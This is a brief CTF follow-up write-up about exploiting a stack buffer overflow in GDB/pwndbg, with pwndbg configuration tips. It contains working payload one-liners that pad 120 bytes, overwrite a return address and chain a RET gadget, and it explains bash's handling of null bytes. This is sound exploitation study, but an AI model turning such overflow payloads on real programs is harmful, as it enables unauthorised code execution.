## Post-post event

My previous write up has left some bad taste in my mouth, so I decided to explore more and fortunately learnt a bit more.

### Using GDB and bash command substitution

I decided to try out more payloads in GDB/pwndbg. As a reminder ~to myself~:

![image](https://user-images.githubusercontent.com/114584910/196032323-c5167c36-4da7-40cb-b092-9183a16e6e62.png)

I confirmed both of the following inputs worked (the flag is printed).

``` bash
r <<< $(python3 -c 'from pwn import *;print("-1\n"+"A"*120+p32(0x401348).decode("utf-8"))')
r <<< $(python3 -c 'from pwn import *;print("-1\n"+"A"*120+p64(0x401348).decode("utf-8"))')
```

However when I tried to use the *RET gadget* in 0x401342 and then going to 0x401343 - I hit a wall:

``` bash
r <<< $(python3 -c 'from pwn import *;print("-1\n"+"A"*120+(p64(0x401342)+p64(0x401343)).decode("utf-8"))')
```

Upon inspecting the stack:

![image](https://user-images.githubusercontent.com/114584910/196034092-c7bfe100-874d-404d-9101-33a49afd52bd.png)

I finally understood what the phrase **/bin/bash: warning: command substitution: ignored null byte in input** meant.

Then I found [this explanation on StackOverflow](https://stackoverflow.com/questions/42954927/why-is-filtering-null-bytes-in-gdb-where-does-not) and I changed the payload accordingly.

### Some tips on using pwndbg

I can't help but notice how pwndbg omits repeating lines, sometimes at the expense of hiding where rbp is. This is bad.
I couldn't find a full list of configs online, but I found the `set` command so I `set telescope-skip-repeating-val off`.

![image](https://user-images.githubusercontent.com/114584910/196037246-de046c92-5f63-4c7e-aee0-0b466f1a87d2.png)<br/>*(not the actual flag)*
